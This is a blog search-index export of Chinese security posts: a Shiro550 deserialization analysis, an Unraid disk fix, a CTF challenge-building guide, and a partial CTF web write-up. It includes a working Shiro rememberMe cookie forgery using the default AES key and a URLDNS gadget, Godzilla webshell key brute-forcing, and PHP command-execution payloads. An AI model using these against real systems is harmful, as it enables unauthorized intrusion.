<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Shiro550流程分析</title>
    <url>/2024/03/20/Shiro550%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>好久没写了, 写一个Shiro550的加密分析</p>
<p>参考</p>
<blockquote>
<p><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.788&vd_source=d3761bfc1ec1605b713147f954cd2f3c">https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.788&amp;vd_source=d3761bfc1ec1605b713147f954cd2f3c</a></p>
<p><a href="https://blog.csdn.net/xhy18634297976/article/details/122794612">https://blog.csdn.net/xhy18634297976/article/details/122794612</a></p>
</blockquote>
<p>shiro的安装等步骤根据白日梦组长的视频来, 这里直接分析</p>
<p>shiro 1.2.4项目结构如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403181953355.png" alt="image-20240318195334316"></p>
<p>直接从头审计不太可能, 我们根据shiro550的漏洞触发点来自Cookie中的rememberme字段, 我们搜索项目中的cookie</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403181953592.png" alt="image-20240318195348561"></p>
<p>找到了第二个class, 进去看看结构和方法, 并大致看一遍, 可以找到其中比较关键的<code>rememberSerializedIdentity</code>和<code>getRememberedSerializedIdentity</code>这两个方法, 前一个将数据进行了base64并赋给cookie , 另一个则是从cookie中取出数据并base64解码</p>
<p>我们需要知道base64上一步是什么, 所以我们向上查找<code>rememberSerializedIdentity</code>的用法, 也就是哪里调用了它, 找到了<code>rememberIdentity</code>方法, 继续查找用法找到另一个重载的<code>rememberIdentity</code>方法中, 里面调用<code>getPrincipals</code>方法给<code>principals</code>赋了值</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321941.png" alt="image-20240318200424398"></p>
<p>​								<code>rememberIdentity</code>方法</p>
<blockquote>
<p>principals身份，即主体的标识属性, 这里应该表示的就是cookie中存放的身份识别</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321737.png" alt="image-20240318202016986"></p>
<p>​								重载的<code>rememberIdentity</code>方法</p>
<p>继续向上查找, 在<code>onSuccessfulLogin</code>中调用了<code>rememberIdentity</code>, 如果<code>isRememberMe(token)</code>成立, 则继续调用, 这里判断的就是是否选择了remenberme, 之后就会按照上面倒过来的顺序一步步进入序列化</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321825.png" alt="image-20240318204741159"></p>
<p>摸清楚调用顺序后, 我们回过头来在寻找其中的加密的地方</p>
<p>跟进<code>rememberIdentity</code>中的<code>convertPrincipalsToBytes</code>, 这个方法将身份认证序列化后进行了加密<code>getCipherService</code>最后指向了<code>AbstractRememberMeManager</code>类的构造函数, 在里面对<code>cipherService</code>赋值了<code>AesCipherService</code></p>
<p><code>AesCipherService</code>类里面有一些aes加密的参数, 可以猜测shiro的加密方式是将认证序列化后进行了aes加密, 最后base64一下放在了cookie中, 后面验证猜想正确</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321797.png" alt="image-20240318200759805"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321480.png" alt="image-20240318211725384"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321458.png" alt="image-20240318201006869"></p>
<p>看完条件, 继续跟进<code>encrypt</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321755.png" alt="image-20240318201327066"></p>
<p>重点看这一句, 第二个参数明显是加密的密钥</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br></pre></td></tr></table></figure>

<p>第二个参数重点关注, 我们跟进去发现是一个返回的变量, 查找用法, 在写入里面发现了对其赋值的<code>setEncryptionCipherKey</code>方法, 继续查找用法找到<code>setCipherKey</code>方法, 继续查找, 最终找到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br></pre></td></tr></table></figure>

<p>而这个<code>DEFAULT_CIPHER_KEY_BYTES</code>是一个常量<br><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182125401.png" alt="image-20240318212506366"></p>
<p>最后关注<code>encrept</code>方法, 我点击进去发现是个接口, 看不了具体方法, 所以开了调试, 这样就可以跟进了, 进入<code>JcaCipherService</code>类, 代码如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321030.png" alt="image-20240318213056726"></p>
<p>iv在aes加密中是初始向量, 一般是随机生成, 这里跟进最后得到ivBytes的生成为一个随机数</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321571.png" alt="image-20240318213719957"></p>
<p>最后得到一个16位长的数组</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321682.png" alt="image-20240318213829744"></p>
<p>一直跟进, 可以得到加密类型, 确实是AES加密, 使用iv作为初始向量, CBC方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321602.png" alt="image-20240318214212833"></p>
<p>参数已知, 加密算法已知, 剩下的就是复刻一个算法了</p>
<blockquote>
<p>这里补充一嘴, iv作为随机数, 每次的值都不是一样的, 那么解密过程应该用不到iv</p>
</blockquote>
<p>然后注意一下, shiro中的加密不是单纯的aes加密, 在<code>encrypt</code>方法中, 我们可以发现其返回结果不止是加密后的密文, 还包括了16位的iv, 也就是<code>base64(iv+encrypted)</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321378.png" alt="image-20240318221243193"></p>
<p>这样的话, 我们对一般的aes加密程序做一下修改, 在base64里面的前面多加一个iv就行了(因为iv的值会被去掉, 留下后面的那部分进去aes的解密)</p>
<p>我尝试了加入16位的其他数据, 利用失败了, 说明还是会检测一下前面16位和iv的对应关系</p>
<p>使用urldns的链子打一下</p>
<p>生成反序列化数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS_exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://6ccnx1.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">1234</span>);</span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line"><span class="comment">//        unserialize(&quot;url.ser&quot;);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;url.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对数据加密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>():</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    fake = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(fake))</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    cipher = AES.new(key, mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + cipher.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext  <span class="comment"># 返回密文</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    plaintext = <span class="string">b&quot;HelloAES&quot;</span>  <span class="comment"># 待加密的明文</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf\\web_tools\\2_JAVA_tools\\Yso_src\\ysoserial\\url.ser&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        text = f.read()</span><br><span class="line">    encdata = encrypt(text)</span><br><span class="line">    <span class="built_in">print</span>(encdata)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里没打cb链子, 主要是我还没学, 可以用来检测是否存在shiro550</p>
<p>总结下来用到的只有加密和解密的分析, 反序列化入口就在<code>Deserializatie</code>那里, 后续就是常规反序列化链子, 比cc链分析都简单</p>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>Safety</tag>
      </tags>
  </entry>
  <entry>
    <title>Unraid盘符的只读问题修复</title>
    <url>/2023/09/28/unraid%E7%9B%98%E7%AC%A6%E5%8F%AA%E8%AF%BB%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<p>一开始以为是unraid的问题, 就去找unraid相关的帖子看看有没有解决办法</p>
<p>但是并没有, 这让我很头疼, 于是先开了unraid的命令行看一下情况</p>
<p>df -h看起来没啥问题 (图片是后来修好了之后才截的, 不过复现也很简单就不节外生枝了)</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309260732559.png" alt="image-20230926073216523"></p>
<p>mount查看一下挂载情况</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309260733970.png" alt="image-20230926073332944"></p>
<p>在这里能看到挂载情况是ro (图同上, 把rw看成ro就可以)</p>
<p>我们unmount一下再重新挂载看看</p>
<p>没有unmount命令, 加上unraid这个系统没找到包管理器, 想别的办法</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309260734374.png" alt="image-20230926073439349"></p>
<p>因为再webui里面有unmount, 就直接用了</p>
<p>之后使用<code>mount /dev/nvme0n1p3 /mnt/disks/ZTA21T0KA230550818-part3</code>手动挂载</p>
<p>报错, 显示windows的缓存还在 (图片引用了别人的, 我忘记截图了)</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309260737776.png" alt="image-20230926073727753"></p>
<p>另外查看这块盘上的内容可以发现有个132g的hiberfile.sys, 这东西就是windows的休眠文件, 根据已有信息, 判断windows自动修复的时候把快速启动选项给重新开启了, 所以才会生成这种文件</p>
<p>试了几种方法, 我这里启动这块盘上的windows, 关闭快速启动后还是只读, 于是再次开启windows发现hiberfile.sys还在, 于是使用</p>
<p><code>powercfg -h off</code> 命令彻底关闭, 查看磁盘发现hiberfile文件已删除</p>
<p>重新启动, 问题解决</p>
<p>这里我其实也试了<code>sudo ntfs-3g -o remove_hiberfile /dev/nvme0n1p3 /mnt/disks/ZTA21T0KA230550818-part3</code></p>
<p>不过无法挂载, 所以才找了别的方法</p>
]]></content>
      <tags>
        <tag>Unraid</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>出题教程</title>
    <url>/2023/09/28/%E5%87%BA%E9%A2%98%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>web的题目按照docker来构建镜像</p>
<p>一般来说需要两个文件, 但是当只需要拉取别人制作好的镜像的时候其实只需要docker-compose.yml</p>
<p>docker-compose.yml和Dockerfile</p>
<p>下面是两个是简单示例</p>
<h3 id="题目结构"><a href="#题目结构" class="headerlink" title="题目结构"></a>题目结构</h3><p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230120067.png" alt="image-20230909133516054"></p>
<h2 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker-compose.yml</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">web_multi</span></span><br><span class="line">    <span class="comment"># 当build和image同时出现时, 会把image当成这个镜像的名称</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:80&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FLAG=flag&#123;test_flag&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx:alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> 1.html /usr/share/nginx/html/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="comment">#nginx版本</span></span><br></pre></td></tr></table></figure>

<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.2</span>-apache</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src /var/www/html</span></span><br><span class="line"><span class="comment">#会把src目录下的文件全部复制过去, 不是复制src文件夹</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag.sh /flag.sh</span></span><br><span class="line"><span class="comment">#把当前目录下的flag.sh复制到根目录下</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /flag.sh</span></span><br><span class="line"><span class="comment">#apache版本</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>这样一道最简单的纯html题目就搭建好了</p>
<p>如果需要加入php, 则需要在Dockerfile里面拉取php的镜像并构建</p>
<blockquote>
<p>比如FROM php:5.6-fpm-alpine</p>
<p>或者是FROM ctfhub&#x2F;base_web_nginx_php_74</p>
<p>或者ctftraining&#x2F;base_image_nginx_mysql_php_73</p>
</blockquote>
<p>还可以加入flag.sh初始化脚本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt; /flag <span class="comment"># 将flag写入根目录</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> FLAG=not_flag</span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -f /flag.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;s/flag&#123;test&#125;/$FLAG/&#x27;</span> /var/www/html/flag.php <span class="comment"># 将flag写入根目录</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> FLAG=not_flag</span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -f /flag.sh</span><br></pre></td></tr></table></figure>

<p>这里有个坑, 一定要用\r也就是回车才行, 而回车在linux中是\n, 在windows中式\r\n, linux不认识\r, 故flag.sh会报错不能执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230120521.png" alt="image-20230909202502167"></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">webapp</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── start.sh</span><br><span class="line">└── src</span><br><span class="line">    └── index.php</span><br></pre></td></tr></table></figure>

<ol>
<li>sed -i 后面一定跟着双引号, 单引号是会被当成字符串</li>
</ol>
<p>我的实现方案是</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#docker-compose.yml</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nanamo/web_multi</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:80&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FLAG=flag&#123;test_flag&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Dockerfile</span></span><br><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.2</span>-apache</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag.sh /flag.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /flag.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /flag.sh <span class="comment"># 执行flag.sh, 但是执行完就会停止容器, 不清楚为什么</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#flag.sh</span></span><br><span class="line">sed -i <span class="string">&quot;s/flag&#123;test&#125;/<span class="variable">$FLAG</span>/&quot;</span> /var/www/html/F14g.php</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> FLAG=not_flag</span><br><span class="line"></span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line">service apache2 start <span class="comment">#不启动就会卡在下一步</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> -f /dev/null <span class="comment">#能够让flag.sh执行完之后不会停止容器</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/ctf%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%92%8C%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97.html#%E6%80%BB%E7%BB%93">https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/ctf%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%92%8C%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97.html#%E6%80%BB%E7%BB%93</a></p>
<p><a href="https://www.v0n.top/2020/05/01/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8Docker%E5%87%BA%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9B%AE/">https://www.v0n.top/2020/05/01/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8Docker%E5%87%BA%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9B%AE/</a></p>
</blockquote>
<p>如果遇上要拉取的镜像太大的时候, 可以更换apt源和pip源, 能够提高速度</p>
<p>只需要在添加一个source.list在目录中,, 一般是Dockerfile的同级目录</p>
<p>里面填上需要更换的apt源</p>
<p>在Dockerfile里加上<code>ADD ./sources.list /etc/apt</code></p>
<p>pip更新的话用这个</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Upgrade pip</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install --upgrade pip</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Chive ctf校赛wp-nanamo版本-WEB</title>
    <url>/2024/04/14/%E6%A0%A1%E8%B5%9Bwp-nanamo%E7%89%88%E6%9C%AC-WEB/</url>
    <content><![CDATA[<h2 id="Hacker-ouT"><a href="#Hacker-ouT" class="headerlink" title="Hacker ouT!"></a>Hacker ouT!</h2><p>签到题目, 想办法修改<code>cookie</code>的<code>user</code>为admin就可以了<br>办法太多了, 直接<code>devtools</code>解决最简单</p>
<h2 id="冷冽谷的哥斯拉"><a href="#冷冽谷的哥斯拉" class="headerlink" title="冷冽谷的哥斯拉"></a>冷冽谷的哥斯拉</h2><p>题目不算太难, 但是可能大部分人没有见过所以不太好做</p>
<p>首先扫了一下网页, 没找到啥有用的, 先用<code>dirsearch</code>扫一遍<br><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-04/202404092006278.png" alt="image.png"><br>访问<code>shell.jsp</code>, <code>ctrl+u</code>查看源码<br>有了解过的应该能看出来这个是一个魔改的哥斯拉🐎, 格式是<code>jsp base64</code>, 给出的</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">xxxx</span> <span class="operator">=</span> <span class="string">&quot;ffe3f468070ae0da&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">pppp</span> <span class="operator">=</span> <span class="string">&quot;Noz0m1&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>应该就是原始哥斯拉🐎中的</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">String xc=<span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line">String pass=<span class="string">&quot;pass&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>哥斯拉连接需要<code>pass</code>和<code>key</code>, <code>pass</code>就是<code>Noz0m1</code><br>通读一下, 文件就是做了一下混淆, 没有动别的配置, 所以接下来, 我们需要拿到<code>key</code>, 这里需要了解一下哥斯拉🐎的生成机制, 这里直接给出, 文件中的<code>ffe3f468070ae0da</code>是<code>key</code>经过<code>md5</code>后的前16位, 所以下一步我们可以直接尝试爆破, 让gpt写了一个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的MD5密文前16位</span></span><br><span class="line">known_prefix = <span class="string">&quot;ffe3f468070ae0da&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_md5</span>(<span class="params">known_prefix</span>):</span><br><span class="line">    characters = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历明文长度从1到6</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>):</span><br><span class="line">        <span class="comment"># 生成所有长度为length的明文组合</span></span><br><span class="line">        <span class="keyword">for</span> combination <span class="keyword">in</span> itertools.product(characters, repeat=length):</span><br><span class="line">            plain_text = <span class="string">&#x27;&#x27;</span>.join(combination)</span><br><span class="line">            full_hash = hashlib.md5(plain_text.encode()).hexdigest()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\rCurrent plaintext: <span class="subst">&#123;plain_text&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果前16位匹配，则输出结果</span></span><br><span class="line">            <span class="keyword">if</span> full_hash[:<span class="number">16</span>] == known_prefix:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\nFound matching plain text:&quot;</span>, plain_text)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Full MD5 hash:&quot;</span>, full_hash)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Starting MD5 cracking...&quot;</span>)</span><br><span class="line">crack_md5(known_prefix)</span><br></pre></td></tr></table></figure>
<p>稍微等一会, 能够爆出来<code>key</code>是<code>chive</code>, 用哥斯拉连接, 成功<br><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-04/202404092032419.png" alt="image.png"><br>然后进去<code>cat /flag</code>拿到flag就行了</p>
<h2 id="php-tricks"><a href="#php-tricks" class="headerlink" title="php_tricks"></a>php_tricks</h2><p>借鉴了知识星球的题目, 之前和某xyctf出题师傅讨论过, 所以拿来出题了<br>(后来发现貌似考点2flag.php忘记加显示源码了, 所以就当没有算了(-&lt;-)</p>
<p>题目意思很简单, 接收get参数和post参数, get参数构成<code>call_user_func</code>的两个参数, post参数构成可变函数</p>
<p>思路是找到合适的回调函数, 将最后一层构造成诸如<code>system(&#39;ls&#39;)</code>这样的格式<br>下一步是构造外面一层, 也就是构造<code>call_user_func</code>回调函数, </p>
<p>我的思路如下, 因为<code>$parameters</code>变量是一个数组, 所以利用<code>array_key_first</code>取出了数组的第一个key也就是<code>utf8_decode</code><br><code>utf8_decode($_POST[&#39;a&#39;])</code>对我输入的a并不会产生什么影响, 结果就是<code>system</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fyuction=array_key_first&amp;utf8_decode=1</span><br><span class="line">post: a=system&amp;b=ls</span><br></pre></td></tr></table></figure>
<p>另一个师傅思路如下, <code>current</code>默认是数组的第一项, 后面思路就一样了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fyuction=current&amp;a=current</span><br><span class="line">post:a[]=system&amp;b=whoami</span><br></pre></td></tr></table></figure>

<p>比较easy~</p>
<h2 id="iT’s-MyPin"><a href="#iT’s-MyPin" class="headerlink" title="iT’s MyPin"></a>iT’s MyPin</h2><p>比较麻烦, 但是不难的一个题目</p>
<p>首先题目给出了源码, (不方便阅读就ctrl+u看源码)仔细阅读之后, 发现<code>debug=True</code>开启了flask的debug模式, 这个经常考到算pin码rce</p>
<p>在<code>/api</code>路由中, 有个典型的merge函数, 做过题目的应该知道是<code>原型链污染</code>的一个标志了, 没做过的搜一下这个奇怪的函数也很容易搜到, 结构我是没有修改的, 这里是将post传入的数据merge给了instance, 这样做实际上我们可以构造请求体来控制任意变量, 下面有个<code>__file__</code>正好被读取了, 可以试着修改这个变量来做任意文件读取</p>
<p>格式不唯一, 具体可以查看网上关于python原型链污染的文章, 我这里用的这个</p>
